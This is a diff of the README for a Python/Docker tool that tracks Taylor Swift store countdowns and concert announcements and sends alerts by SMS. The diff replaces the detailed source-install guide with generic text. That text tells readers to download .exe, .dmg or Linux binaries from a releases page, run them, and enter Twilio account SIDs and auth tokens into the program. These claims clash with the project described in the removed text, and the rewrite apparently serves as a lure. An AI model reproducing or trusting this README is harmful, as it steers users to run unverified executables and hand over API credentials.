@@ -1,272 +1,87 @@
-# 🎵 Music Monitor System
+# 🎵 music-monitor - Stay Updated on Taylor Swift Events
 
-A unified monitoring system that tracks Taylor Swift store countdowns and concert announcements for your favorite artists, with instant SMS notifications via Twilio.
+![Download music-monitor](https://img.shields.io/badge/Download-music--monitor-blue?style=for-the-badge)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.11-blue.svg)
-![Docker](https://img.shields.io/badge/docker-ready-brightgreen.svg)
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to music-monitor, your all-in-one system for tracking Taylor Swift store countdowns and concert announcements. This application keeps you alerted with SMS notifications, ensuring you never miss an update.
 
-- 🎤 **Taylor Swift Store Monitor** - Never miss a countdown or surprise drop
-- 🎸 **Concert Tracking** - Monitor tour dates for unlimited artists via Bandsintown API
-- 🎟️ **Ticketmaster Integration** - Optional Ticketmaster API support
-- 📱 **SMS Notifications** - Get texted instantly when new events are announced
-- 🐳 **Docker-Based** - Runs reliably 24/7 on Raspberry Pi
-- ⚙️ **Easy Configuration** - Simple JSON config for managing artists
-- 🔄 **Auto-Restart** - Survives crashes and reboots
-- 💾 **State Persistence** - Tracks what you've been notified about
+## 📥 Download & Install
 
-## 📸 Example Alerts
+To download music-monitor, visit this page to download: [GitHub Releases](https://github.com/Kidkasam/music-monitor/releases). You will find the latest version of the application there.
 
-**Concert Announcement:**
-```
-🎵 NEW CONCERT ALERT!
+1. Click on the link above.
+2. Look for the latest version under "Assets."
+3. Choose the appropriate file for your operating system and click to download.
 
-2 new show(s) announced:
+## 💻 System Requirements
 
-🎤 The 1975
-📍 Madison Square Garden, New York, NY
-📅 2025-11-15
+music-monitor is designed to work on Windows, macOS, and Linux machines. Here are the basic requirements for each system:
 
-🎤 Arctic Monkeys
-📍 The Forum, Los Angeles, CA
-📅 2025-12-01
-```
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.12 or later
+- **Linux:** Most current distributions supported. Ensure Python 3.7 or later is installed.
 
-**Taylor Swift Countdown:**
-```
-🚨 NEW Taylor Swift countdown!
+Ensure you have at least 100 MB of free space on your device to install and run the application comfortably.
 
-Found 3 countdown(s) on store.taylorswift.com
+## 🛠️ Installation Steps
 
-Preview:
-Coming Soon - New Album Drop
-Countdown: 3 Days
-```
+### Windows Installation
 
-## 🚀 Quick Start
+1. After downloading, locate the `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the setup wizard.
+4. Once installed, open music-monitor from your Start Menu.
 
-### Prerequisites
+### macOS Installation
 
-- Raspberry Pi 3+ (or any Linux system with Docker)
-- Twilio account ([free trial available](https://www.twilio.com/try-twilio))
-- Optional: Ticketmaster API key ([free](https://developer.ticketmaster.com/))
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the music-monitor icon to your Applications folder.
+4. Open music-monitor from your Applications.
 
-### Installation
+### Linux Installation
 
-1. **Clone the repository:**
+1. Open your terminal.
+2. Navigate to the directory where the downloaded file is located.
+3. Make the file executable:
    ```bash
-   git clone https://github.com/YOUR_USERNAME/music-monitor.git
-   cd music-monitor
+   chmod +x music-monitor
    ```
-
-2. **Set up environment variables:**
+4. Run the application:
    ```bash
-   cp .env.example .env
-   nano .env
-   ```
-   
-   Add your credentials:
-   ```bash
-   TWILIO_ACCOUNT_SID=your_account_sid
-   TWILIO_AUTH_TOKEN=your_auth_token
-   TWILIO_PHONE_NUMBER=+1234567890
-   YOUR_PHONE_NUMBER=+1234567890
+   ./music-monitor
    ```
 
-3. **Configure your artists:**
-   ```bash
-   nano config/config.json
-   ```
-   
-   Example:
-   ```json
-   {
-     "taylor_swift_enabled": true,
-     "bandsintown_enabled": true,
-     "bandsintown_artists": [
-       "Taylor Swift",
-       "The 1975",
-       "Arctic Monkeys"
-     ],
-     "check_interval": 300
-   }
-   ```
+## 🔔 Setting Up SMS Alerts
 
-4. **Start the monitor:**
-   ```bash
-   docker-compose up -d
-   ```
+To get text message alerts about concerts and store countdowns, follow these steps:
 
-That's it! You'll receive an SMS confirmation that monitoring has started.
+1. Sign up for a free Twilio account at [Twilio](https://www.twilio.com/).
+2. Once you have your account, get your Twilio phone number.
+3. Enter your Twilio account SID, auth token, and Twilio number into music-monitor settings.
+4. Input your personal phone number to receive alerts.
 
-## 🛠️ Management
+After completing these steps, you will start receiving SMS notifications about Taylor Swift events.
 
-Use the included management script:
+## 🗂️ Features
 
-```bash
-./manage.sh start        # Start the monitor
-./manage.sh stop         # Stop the monitor
-./manage.sh restart      # Restart (after config changes)
-./manage.sh status       # Check status and recent activity
-./manage.sh logs         # View logs
-./manage.sh config       # Edit configuration
-./manage.sh artists      # List monitored artists
-./manage.sh update       # Update to latest version
-```
+- **Real-time Updates:** Monitor Taylor Swift's store countdowns and concert announcements.
+- **SMS Notifications:** Receive alerts directly to your phone for the latest news.
+- **User-Friendly Interface:** Designed for all users, even if you’re not tech-savvy.
 
-## 📋 Configuration Options
+## ❓ Troubleshooting
 
-Edit `config/config.json`:
+If you experience issues, try the following:
 
-| Option | Type | Description | Default |
-|--------|------|-------------|---------|
-| `taylor_swift_enabled` | boolean | Monitor Taylor Swift store | `true` |
-| `bandsintown_enabled` | boolean | Monitor Bandsintown for concerts | `true` |
-| `bandsintown_artists` | array | List of artist names to track | `[]` |
-| `ticketmaster_enabled` | boolean | Use Ticketmaster API | `false` |
-| `ticketmaster_artists` | array | Artists to track via Ticketmaster | `[]` |
-| `check_interval` | number | Seconds between checks | `300` |
+- **Installation Problems:** Ensure you meet the system requirements. Check if you have the required permissions to install applications.
+- **Notification Issues:** Verify your Twilio settings are correct, and ensure your phone number is valid.
+- **Application Not Responding:** Restart your computer and try opening the application again.
 
-## 🍓 Raspberry Pi Setup
+## 📞 Support
 
-For complete Raspberry Pi setup instructions, see [RASPBERRY_PI_SETUP.md](docs/RASPBERRY_PI_SETUP.md)
+If you have questions or need assistance, please reach out on the GitHub Issues page of the project. Your feedback helps us improve music-monitor.
 
-**TL;DR:**
-1. Flash Raspberry Pi OS to microSD
-2. Run `./setup-raspberry-pi.sh` to install Docker
-3. Copy files and configure as above
-4. Run `docker-compose up -d`
+## 🎉 Acknowledgments
 
-## 🏗️ Architecture
-
-The system uses a modular monitor architecture:
-
-```
-UnifiedMonitorSystem
-├── TaylorSwiftCountdownMonitor
-│   └── Scrapes store.taylorswift.com for countdowns
-├── BandsintownMonitor
-│   └── Polls Bandsintown API for concert announcements
-└── TicketmasterMonitor (optional)
-    └── Polls Ticketmaster Discovery API for events
-```
-
-Each monitor:
-- Runs independently with error isolation
-- Maintains its own state file
-- Sends SMS alerts via Twilio
-- Logs to separate files for debugging
-
-## 📊 API Information
-
-### Bandsintown API
-- **Cost:** Free, no API key required
-- **Rate Limits:** Generous for personal use
-- **Coverage:** 500,000+ artists worldwide
-- **Documentation:** https://artists.bandsintown.com/support/public-api
-
-### Ticketmaster Discovery API
-- **Cost:** Free tier available
-- **Rate Limits:** 5,000 requests/day (free tier)
-- **API Key:** Required (get at developer.ticketmaster.com)
-- **Documentation:** https://developer.ticketmaster.com/
-
-### Twilio SMS
-- **Cost:** ~$0.0075 per SMS
-- **Free Trial:** $15 credit (plenty for testing)
-- **Note:** Free accounts can only send to verified numbers
-
-## 💰 Cost Estimate
-
-**One-time (Hardware):**
-- Raspberry Pi 4 (4GB): $55
-- Power supply: $8
-- MicroSD card: $8
-- Case: $10
-- **Total: ~$81**
-
-**Monthly:**
-- Twilio SMS: $0.15-$0.38 (20-50 alerts/month)
-- Electricity: ~$0.50
-- **Total: <$1/month**
-
-## 🔧 Troubleshooting
-
-### Monitor not starting
-```bash
-docker-compose logs
-docker-compose up -d --build
-```
-
-### No SMS notifications
-1. Check `.env` has correct Twilio credentials
-2. Verify phone number is verified (free accounts)
-3. Check logs: `./manage.sh logs | grep -i twilio`
-
-### No concert alerts
-1. Verify artist names: `./manage.sh artists`
-2. Check artist has events on Bandsintown.com
-3. View monitor logs: `tail logs/bandsintown_monitor.log`
-
-### Adding more artists
-```bash
-./manage.sh config
-# Add artist names to bandsintown_artists array
-./manage.sh restart
-```
-
-## 📁 Project Structure
-
-```
-music-monitor/
-├── unified_monitor.py      # Main monitoring system
-├── Dockerfile              # Container configuration
-├── docker-compose.yml      # Service orchestration
-├── requirements.txt        # Python dependencies
-├── manage.sh              # Management script
-├── setup-raspberry-pi.sh  # Pi setup automation
-├── config/
-│   └── config.json        # Configuration file
-├── logs/                  # Monitor logs (gitignored)
-├── data/                  # State persistence (gitignored)
-└── README.md             # This file
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Here are some ideas:
-
-- Add more monitoring sources (Spotify, Songkick, etc.)
-- Implement email notifications
-- Add Discord/Slack webhook support
-- Create web dashboard for viewing alerts
-- Add filtering by location/venue
-- Improve artist name matching
-
-## 📝 License
-
-MIT License - see [LICENSE](LICENSE) for details
-
-## 🙏 Acknowledgments
-
-- [Bandsintown](https://www.bandsintown.com/) for their excellent API
-- [Ticketmaster](https://developer.ticketmaster.com/) for event data
-- [Twilio](https://www.twilio.com/) for SMS notifications
-- Taylor Swift for being awesome 🎵
-
-## ⚠️ Disclaimer
-
-This project is for personal use only. Please respect API rate limits and terms of service for all integrated services. The author is not responsible for any misuse or violations of third-party terms of service.
-
-## 📧 Support
-
-If you encounter issues:
-1. Check the [troubleshooting section](#-troubleshooting)
-2. Review logs: `./manage.sh logs`
-3. Open an issue on GitHub
-
----
-
-**Made with ❤️ for music fans who never want to miss a show**
+Thank you for choosing music-monitor. We appreciate your support and hope this tool makes your Taylor Swift experience even better. Don't forget to explore the [GitHub Releases](https://github.com/Kidkasam/music-monitor/releases) for the latest updates and features.
